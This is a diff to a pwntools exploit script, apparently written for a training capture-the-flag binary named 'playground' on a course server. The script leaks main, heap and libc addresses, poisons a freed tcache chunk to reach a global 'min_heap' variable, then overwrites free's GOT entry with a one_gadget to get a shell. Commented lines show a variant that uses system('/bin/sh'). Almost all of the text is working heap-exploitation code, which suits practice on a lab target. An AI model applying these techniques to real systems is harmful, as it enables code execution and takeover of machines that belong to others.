@@ -99,44 +99,50 @@ one_gadget=0x00
 if args["ONE_GADGET"]:
 	one_gadget = int(args["ONE_GADGET"], 16)
 if args["REMOTE"]:
-	r = remote("in.training.offdef.it", 4110)
+	r = remote("bin.training.offdef.it", 4110)
+elif args["GDB"]:
+	r = gdb.debug("./playground", f"""
+	# b *{b_main}
+	unset env
+	set disable-randomization off
+	set debuginfod enabled on
+	""")
 else:
 	r = process("./playground")
-	if args["GDB"]:
-		gdb.attach(r, f"""
-		# b *{b_main}
-		unset env
-		set disable-randomization off
-		set debuginfod enabled on
-		c
-		""")
-		input("wait")
 
 LIBC = ELF("./libc-2.27.so")
-#LIBC.symbols["__symol_name"]
-
+EXE = ELF("./playground")
 
 time.sleep(0.5)
 
+#LEAK MAIN
 a_main = get_a_main(r)
 print("leak main: ", hex(a_main))
+EXE.address = a_main - 0x11d9
+a_min_heap = EXE.symbols["min_heap"]
+a_min_heap_prec = a_min_heap - 0x08
 
 #LEAK LIBC
 a_heap = alloc(r, 0x600)
-print("leak heap:", hex(a_heap))
 alloc(r, 0x10)						# no coalescing
 free(r, a_heap)
 show(r, a_heap, 1)
 LIBC.address = get_leak_libc(r) - 0x3ebca0
 print("leak libc", hex(LIBC.address))
 
-#FASTBIN ATTACK
-
+#ATTACK
 a = alloc(r, 0x20)
 free(r, a)
-write(r, a, LIBC.symbols["__free_hook"] - 0x10, len(str(LIBC.symbols["__free_hook"] - 0x10)))
+write(r, a, a_min_heap_prec, 8)
 alloc(r, 0x20)
-alloc(r, 0x20)
-input("wait")
+min_heap_prec_chunk = alloc(r, 0x20) # key is set to 0 -> min_heap is set to 0
+
+#Overwrite of free in got
+write(r, EXE.got["free"], LIBC.address + one_gadget, len(str(LIBC.address + one_gadget)))
+#write(r, EXE.got["free"], LIBC.symbols["system"], len(str(LIBC.symbols["system"])))
+#a = alloc(r, 0x50)
+#write(r, a - 0x10, b"/bin/sh\x00", 8)
+#r.clean()
+#send(r, ["free ", str(a - 0x10)])
 
 r.interactive()
